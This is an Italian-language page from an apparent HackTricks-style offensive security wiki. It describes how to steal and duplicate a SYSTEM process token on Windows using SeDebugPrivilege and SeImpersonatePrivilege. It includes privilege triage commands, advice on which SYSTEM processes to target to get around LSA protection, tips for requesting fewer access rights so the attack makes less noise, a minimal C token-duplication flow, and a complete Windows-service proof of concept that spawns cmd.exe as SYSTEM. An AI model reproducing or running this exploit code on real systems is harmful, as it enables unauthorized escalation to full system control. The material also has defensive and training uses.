# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Questa pagina descrive la variante di **manual token-theft** in cui un contesto con **High Integrity** che dispone già di **`SeDebugPrivilege`** e **`SeImpersonatePrivilege`** apre un processo **SYSTEM** appropriato, **duplica il relativo token** e **avvia un nuovo processo** con quel token.

Se ti serve soltanto una shell **SYSTEM** rapida da un processo amministrativo privilegiato, consulta anche:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Se non disponi di un percorso tramite process handle, ma hai **`SeImpersonatePrivilege`**, il percorso tramite **named-pipe / Potato** è generalmente più semplice:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Triage rapido

Prima di provare il percorso di token-copy, verifica che il processo corrente si trovi già in un contesto utile:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Note:

- **`SeDebugPrivilege`** consente di aprire molti processi SYSTEM **non protetti** anche quando la loro DACL normalmente lo impedirebbe.
- **`SeImpersonatePrivilege`** è ciò che rende **`CreateProcessWithTokenW`** pratico in seguito.
- Se il percorso di copia del token fornisce solo un token SYSTEM debole o filtrato, esegui il furto da un **processo SYSTEM diverso**.

## Scegli attentamente il processo target

La tecnica viene solitamente mostrata contro **`lsass.exe`**, ma nelle versioni moderne di Windows spesso è il target **sbagliato**:

- Se **LSA Protection / RunAsPPL** è abilitato, **`lsass.exe`** è protetto e un normale processo admin con **`SeDebugPrivilege`** non riuscirà comunque ad aprirlo.<sup>[[2]](#references)</sup>
- Preferisci processi SYSTEM **non-PPL** come **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** o un'istanza iniziale di **`svchost.exe`**.
- I **processi protetti** e alcuni processi speciali come **`System`** o **`csrss.exe`** non sono target realistici in user-mode per questa tecnica.
- Usa **Process Hacker / Process Explorer** in esecuzione con privilegi elevati per verificare che il token target disponga effettivamente dei privilegi desiderati prima di duplicarlo.

## Dettagli delle API importanti nella pratica

Molti PoC pubblici richiedono **`PROCESS_ALL_ACCESS`** e **`TOKEN_ALL_ACCESS`**, ma ciò genera più rumore del necessario. Nella pratica:

- Apri il processo target utilizzando solo i diritti necessari (comunemente **`PROCESS_QUERY_INFORMATION`** o **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Apri il token con i diritti necessari per la creazione del processo: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Usa **`DuplicateTokenEx(..., TokenPrimary, ...)`** per creare un **primary token**; un token di impersonificazione da solo non è sufficiente per creare un nuovo processo.
- Se **`CreateProcessWithTokenW`** restituisce l'errore **`1314`**, passa a **`CreateProcessAsUserW`**.
- Se avvii il processo da un **servizio / Session 0**, ricorda che **`CreateProcessWithTokenW`** mantiene il processo figlio nella **sessione del chiamante**. Se ti serve una shell desktop visibile, usa **`CreateProcessAsUserW`** e sposta il token nella sessione desiderata.<sup>[[1]](#references)</sup>

Un flusso moderno minimale è il seguente:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## PoC come Windows service completo

Il seguente codice **sfrutta i privilegi `SeDebugPrivilege` e `SeImpersonatePrivilege`** per copiare il token da un **processo in esecuzione come SYSTEM** e con **tutti i privilegi del token**. In questo caso, il codice può essere compilato e utilizzato come **binario di un Windows service** per verificare che la primitive funzioni.<sup>[[3]](#references)</sup>

La parte principale del **codice in cui avviene l'elevazione** si trova all'interno della funzione **`Exploit`**. All'interno di questa funzione è possibile vedere che viene cercato **`lsass.exe`**, il suo **token viene copiato** e infine tale token viene utilizzato per avviare un nuovo **`cmd.exe`** con tutti i privilegi del token copiato.

Sugli host moderni, spesso sarà necessario sostituire **`lsass.exe`** con un altro **processo SYSTEM non-PPL**, come **`winlogon.exe`**, **`wininit.exe`** o **`services.exe`**.

Altri processi in esecuzione come SYSTEM con tutti o con la maggior parte dei privilegi del token sono: **`services.exe`**, **`svchost.exe`** (alcuni dei primi), **`wininit.exe`**, **`csrss.exe`**... Ricorda che generalmente **non sarà possibile copiare un token da un processo protetto**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Riferimenti

- [1] [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Configura la protezione LSA aggiuntiva (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Eseguire il mio programma come servizio (cboard.cprogramming.com) – scheletro del servizio Windows utilizzato dal PoC](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
